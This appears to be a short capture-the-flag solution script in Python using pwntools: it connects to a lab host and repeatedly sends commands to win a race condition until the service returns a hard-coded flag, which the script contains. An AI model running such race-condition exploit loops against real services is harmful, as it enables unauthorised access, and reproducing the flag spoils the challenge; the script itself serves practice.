from pwn import *

r = remote('up.zoolab.org',10931)

while True:
  r.sendline("R".encode())
  r.sendline("flag".encode())
  # msg = r.recvuntil(b'fla').decode()
  msg = r.recvline().decode()
  print(msg)
  if (msg == "F> FLAG{R@c3_r@ce_c0nditi0n5!!!}\n"):
    break